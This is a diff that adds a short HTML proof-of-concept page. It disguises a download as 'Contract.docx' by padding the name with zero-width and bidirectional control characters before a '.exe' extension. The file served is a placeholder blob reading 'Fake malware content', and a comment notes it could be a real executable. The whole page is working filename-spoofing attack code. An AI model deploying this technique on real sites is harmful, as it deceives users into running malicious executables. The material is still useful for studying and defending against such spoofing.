@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Zero-Width Filename Spoofing</title>
+  </head>
+  <body>
+    <h2>Zero-Width Layering Filename Spoofing</h2>
+    <p>Click the link below to download a disguised executable file:</p>
+
+    <a id="spoofedDownload" href="#">Download Contract</a>
+
+    <script>
+      // Construct misleading filename using invisible & directional characters
+      const spoofedFilename = "Contract.docx" +
+        "\u200B\u200C\u200D\ufeff" + // Zero-width characters
+        "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069" + // Bidi control
+        ".exe";
+
+      // Create fake payload (could be real EXE binary in real-world use)
+      const blob = new Blob(["Fake malware content"], {
+        type: "application/octet-stream"
+      });
+
+      const a = document.getElementById("spoofedDownload");
+      a.href = URL.createObjectURL(blob);
+      a.download = spoofedFilename;
+      a.style.fontFamily = "monospace";
+      a.title = "Actual filename: " + spoofedFilename;
+    </script>
+  </body>
+</html>
